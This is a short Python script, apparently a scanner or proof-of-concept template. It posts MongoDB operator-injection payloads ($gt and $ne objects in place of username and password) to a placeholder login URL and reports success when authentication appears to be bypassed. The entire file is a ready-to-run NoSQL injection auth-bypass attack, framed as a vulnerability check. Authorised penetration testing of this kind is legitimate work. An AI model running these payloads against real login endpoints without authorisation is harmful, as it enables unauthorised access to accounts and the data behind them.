import requests
import sys

# Target Configuration
TARGET_URL = "{{TARGET}}"

# MongoDB operator injection payloads
PAYLOADS = [
    {"username": {"$gt": ""}, "password": {"$gt": ""}},
    {"username": {"$ne": None}, "password": {"$ne": None}},
]

def check_vulnerability():
    print(f"[*] Testing {TARGET_URL} for NoSQL injection (CWE-943)")

    try:
        baseline = requests.post(
            TARGET_URL,
            json={"username": "nonexistent_xyz", "password": "wrong"},
            timeout=10,
        )
    except Exception as e:
        print(f"[-] Baseline request failed: {e}")
        return False

    for payload in PAYLOADS:
        try:
            resp = requests.post(TARGET_URL, json=payload, timeout=10)
            if resp.status_code == 200 and resp.status_code != baseline.status_code:
                print(f"[+] SUCCESS: NoSQL injection bypassed auth with {payload}")
                return True
            if "token" in resp.text or "session" in resp.text:
                print(f"[+] SUCCESS: Auth response obtained via NoSQL payload")
                return True
        except Exception as e:
            print(f"[-] Payload request failed: {e}")

    print("[-] No NoSQL injection vulnerability detected.")
    return False

if __name__ == "__main__":
    sys.exit(0 if check_vulnerability() else 1)
